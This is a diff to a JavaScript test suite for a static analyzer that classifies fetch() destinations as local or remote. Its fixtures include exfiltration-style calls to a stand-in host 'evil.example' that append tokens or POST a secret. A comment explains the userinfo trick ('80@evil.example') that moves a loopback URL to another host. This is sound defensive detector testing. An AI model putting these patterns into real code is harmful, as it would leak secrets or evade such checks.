@@ -132,13 +132,42 @@ test("a loopback destination is treated as local, not a cleartext remote send", 
   assert.equal(ws.cleartext, false);
 });
 
-// The concat-prefix loopback form ("http://127.0.0.1:" + port) resolves the host
-// from the static prefix and is likewise local.
-test("a concat-prefix loopback URL is local (no cleartext, no dataAppended)", () => {
-  const hit = one('fetch("http://127.0.0.1:" + port + "/x");');
-  assert.equal(hit.destClass, URL_CLASS.LOCAL);
-  assert.equal(hit.cleartext, false);
-  assert.equal(hit.dataAppended, false);
+// A loopback prefix is local once its authority has ended: the dynamic tail then
+// continues the path, and cannot move the host.
+test("a loopback prefix with its host closed is local (no cleartext, no dataAppended)", () => {
+  for (const code of [
+    'fetch("http://127.0.0.1/" + path);',
+    'fetch("http://127.0.0.1:8080/" + path);',
+    'fetch("http://localhost:8080?q=" + q);',
+  ]) {
+    const hit = one(code);
+    assert.equal(hit.destClass, URL_CLASS.LOCAL, code);
+    assert.equal(hit.cleartext, false, code);
+    assert.equal(hit.dataAppended, false, code);
+  }
+});
+
+// Until the authority has ended, the dynamic tail can still move the host: ".evil.example"
+// extends it, and "80@evil.example" turns the loopback prefix into userinfo of another
+// host. Such a prefix is not local, and names no host, as the tail decides it. A dynamic
+// port is that case too: nothing static tells a port number from "80@evil.example".
+test("a loopback prefix whose authority is still open is remote, and names no host", () => {
+  for (const code of [
+    'fetch("http://127.0.0.1" + h, { method: "POST", body: secret });',
+    'fetch("http://127.0.0.1:" + h, { method: "POST", body: secret });',
+    'fetch("http://127.0.0.1:" + port + "/x");',
+  ]) {
+    const hit = one(code);
+    assert.equal(hit.destClass, URL_CLASS.REMOTE, code);
+    assert.equal(hit.cleartext, true, code);
+    assert.equal(hit.host, null, code);
+  }
+  // The same holds for any host: an open authority names none.
+  assert.equal(one('fetch("https://api.example.com" + x);').host, null);
+  assert.equal(
+    one('fetch("https://api.example.com/" + x);').host,
+    "api.example.com"
+  );
 });
 
 // A real remote host is unaffected by the loopback exemption - including a
@@ -301,11 +330,14 @@ test("a scheme split across concatenated pieces is read whole", () => {
     'fetch("htt" + "ps://evil.example.com/x" + token);',
     "evil.example.com"
   );
-  remote('fetch("/" + "/evil.example.com/x" + token);', null);
+  remote('fetch("/" + "/evil.example.com/x" + token);', "evil.example.com");
   const arms = ["ab", "cd", "ef", "gh", "ij", "kl"].map(
     ([x, y], i) => `(v${i} ? "${x}" : "${y}")`
   );
-  remote(`fetch("/" + "/evil.example.com/x" + ${arms.join(" + ")});`, null);
+  remote(
+    `fetch("/" + "/evil.example.com/x" + ${arms.join(" + ")});`,
+    "evil.example.com"
+  );
   // A leading run that really is relative still classifies local: reading the
   // whole run must not invent a scheme that is not there.
   assert.equal(
